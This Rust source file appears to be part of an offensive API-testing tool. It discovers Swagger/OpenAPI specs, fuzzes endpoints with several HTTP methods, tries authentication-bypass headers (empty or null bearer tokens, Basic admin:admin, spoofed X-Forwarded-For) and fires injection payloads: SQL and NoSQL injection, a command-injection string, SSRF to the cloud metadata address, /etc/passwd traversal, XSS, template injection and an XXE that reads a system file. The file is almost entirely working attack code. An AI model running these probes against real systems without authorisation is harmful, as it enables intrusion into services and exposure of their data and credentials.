use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn spec(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} OpenAPI/Swagger Spec Discovery", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let spec_paths = [
        "/swagger-ui.html",
        "/swagger-ui/",
        "/swagger-ui/index.html",
        "/swagger",
        "/swagger.json",
        "/swagger.yaml",
        "/openapi.json",
        "/openapi.yaml",
        "/openapi.yml",
        "/v1/swagger.json",
        "/v2/swagger.json",
        "/v3/swagger.json",
        "/v1/openapi.json",
        "/v2/openapi.json",
        "/v3/openapi.json",
        "/api-docs",
        "/api-docs.json",
        "/v1/api-docs",
        "/v2/api-docs",
        "/v3/api-docs",
        "/swagger-resources",
        "/swagger-resources/configuration/ui",
        "/api/swagger.json",
        "/api/openapi.json",
        "/docs",
        "/docs/swagger",
        "/api/docs",
        "/redoc",
        "/rapidoc",
        "/graphiql",
        "/playground",
    ];

    let mut found = 0u32;
    for path in &spec_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        if let Ok(r) = client.get(&target).send().await {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if status == 200 && !text.is_empty() {
                let has_spec = text.contains("swagger")
                    || text.contains("openapi")
                    || text.contains("paths")
                    || text.contains("info");
                if has_spec {
                    println!(
                        "  {} {:35} — SPEC FOUND ({} bytes)",
                        "[!]".red().bold(),
                        path,
                        text.len()
                    );
                    found += 1;
                } else {
                    println!(
                        "  {} {:35} — page ({} bytes)",
                        "[+]".green().bold(),
                        path,
                        text.len()
                    );
                }
            }
        }
    }

    println!("\n  {} {} API specs discovered", "[*]".cyan().bold(), found);

    Ok(())
}

pub async fn fuzz(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} OpenAPI Endpoint Fuzzer", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let body = resp.text().await.unwrap_or_default();

    let mut endpoints: Vec<String> = vec![];
    if body.contains("\"paths\"") {
        let chars = body.chars().peekable();
        let mut in_path = false;
        let mut current = String::new();
        for c in chars {
            if c == '"' && !in_path {
                in_path = true;
                current.clear();
            } else if c == '"' && in_path {
                in_path = false;
                if current.starts_with('/') {
                    endpoints.push(current.clone());
                }
                current.clear();
            } else if in_path {
                current.push(c);
            }
        }
    }

    if endpoints.is_empty() {
        endpoints = vec![
            "/api/v1/users".to_string(),
            "/api/v1/admin".to_string(),
            "/api/v1/config".to_string(),
            "/api/v1/secrets".to_string(),
            "/api/v1/debug".to_string(),
            "/api/v1/health".to_string(),
            "/api/v1/metrics".to_string(),
            "/api/v1/logs".to_string(),
        ];
    }

    let methods = ["GET", "POST", "PUT", "DELETE", "PATCH"];
    let mut tested = 0u32;
    let mut accessible = 0u32;

    for ep in endpoints.iter().take(20) {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        for method in &methods {
            if let Ok(r) = client
                .request(
                    reqwest::Method::from_bytes(method.as_bytes()).unwrap(),
                    &target,
                )
                .send()
                .await
            {
                let status = r.status().as_u16();
                tested += 1;
                if status != 404 && status != 405 {
                    accessible += 1;
                    if status == 200 {
                        println!(
                            "  {} {:6} {:25} — {}",
                            "[+]".green().bold(),
                            method,
                            ep,
                            status
                        );
                    } else if status == 401 || status == 403 {
                        println!(
                            "  {} {:6} {:25} — {} (auth required)",
                            "[!]".yellow().bold(),
                            method,
                            ep,
                            status
                        );
                    }
                }
            }
        }
    }

    println!(
        "\n  {} {} endpoints tested, {} accessible",
        "[*]".cyan().bold(),
        tested,
        accessible
    );

    Ok(())
}

pub async fn auth(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} OpenAPI Auth Bypass", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let auth_bypass_headers = [
        ("No auth", ""),
        ("Bearer null", "Bearer null"),
        ("Bearer undefined", "Bearer undefined"),
        ("Bearer empty", "Bearer "),
        ("Basic admin", "Basic YWRtaW46YWRtaW4="),
        ("API key test", "X-API-Key: test"),
        ("API key admin", "X-API-Key: admin"),
        ("Internal", "X-Internal: true"),
        ("Debug", "X-Debug: true"),
        ("Forwarded for", "X-Forwarded-For: 127.0.0.1"),
    ];

    for (name, header_val) in &auth_bypass_headers {
        let mut req = client.get(url);
        if !header_val.is_empty() {
            if header_val.starts_with("Bearer") || header_val.starts_with("Basic") {
                req = req.header("Authorization", *header_val);
            } else if let Some((key, val)) = header_val.split_once(": ") {
                req = req.header(key, val);
            }
        }
        match req.send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 {
                    println!("  {} {:20} — BYPASSED", "[!]".red().bold(), name);
                } else if status == 401 || status == 403 {
                    println!("  {} {:20} — blocked ({})", "[-]".dimmed(), name, status);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} OpenAPI Parameter Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let inject_params = [
        ("SQLi in param", "id=' OR '1'='1"),
        ("NoSQLi in param", "id={$ne:null}"),
        ("Command inject", "cmd=; id"),
        ("SSRF in URL param", "url=http://169.254.169.254/"),
        ("Path traversal", "file=../../../etc/passwd"),
        ("XSS in param", "name=<script>alert(1)</script>"),
        ("Template inject", "name={{7*7}}"),
        (
            "XXE in XML",
            "data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
        ),
    ];

    for (name, payload) in &inject_params {
        let target = format!("{}?{}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200
                    && (text.contains("uid=") || text.contains("root:") || text.contains("49"))
                {
                    println!("  {} {:20} — INJECTED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
